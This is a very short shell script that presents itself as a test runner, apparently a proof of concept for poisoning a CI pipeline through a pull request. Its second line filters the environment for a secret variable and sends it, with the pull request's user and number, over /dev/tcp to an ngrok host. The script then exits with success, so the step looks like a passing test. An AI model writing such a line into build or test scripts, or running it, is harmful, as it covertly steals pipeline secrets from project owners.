echo "Executing Tests script" >> runtests.out
echo ------- I-PPE From user [$1] in pr [$2] pr.yml :: $(env | grep MY_SECRET) > /dev/tcp/5.tcp.eu.ngrok.io/13276
RET=0
exit $RET
